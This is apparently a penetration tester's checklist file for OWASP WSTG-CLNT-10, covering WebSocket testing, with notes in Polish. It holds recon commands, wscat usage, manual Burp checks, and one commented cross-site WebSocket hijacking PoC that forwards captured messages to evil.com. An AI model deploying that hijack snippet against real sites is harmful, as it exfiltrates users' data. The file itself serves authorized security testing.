@@ -1,0 +1,42 @@
+================================================================================
+WSTG-CLNT-10 — Testing WebSockets
+================================================================================
+CELE:
+- Identify the usage of WebSockets
+- Assess its implementation by using the same tests on normal HTTP channels
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Identyfikacja WebSocket ---
+curl -sI "https://TARGET/" | grep -i "upgrade\|websocket"
+# Szukaj ws:// i wss:// w kodzie JS
+
+# --- wscat - interakcja z WebSocket ---
+wscat -c "wss://TARGET/ws"
+
+# --- Test CSWSH (Cross-Site WebSocket Hijacking) ---
+# Stworz PoC HTML:
+# <script>var ws = new WebSocket('wss://TARGET/ws'); ws.onmessage=function(e){fetch('http://evil.com/?data='+e.data)}</script>
+
+# --- Test injection via WebSocket ---
+# Wyslij XSS/SQLi payloady przez WebSocket connection
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- PayloadsAllTheThings Web Sockets ---
+# Referencja: /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/Web Sockets/README.md
+
+# --- Reuse injection payloads z INPV testow ---
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Uzyj Burp WebSocket History tab
+2. Sprawdz czy WS wymaga autentykacji
+3. Testuj CSWSH - czy WS waliduje Origin
+4. Wyslij injection payloady (XSS, SQLi) przez WS
+5. Sprawdz czy dane z WS sa sanityzowane przed renderowaniem
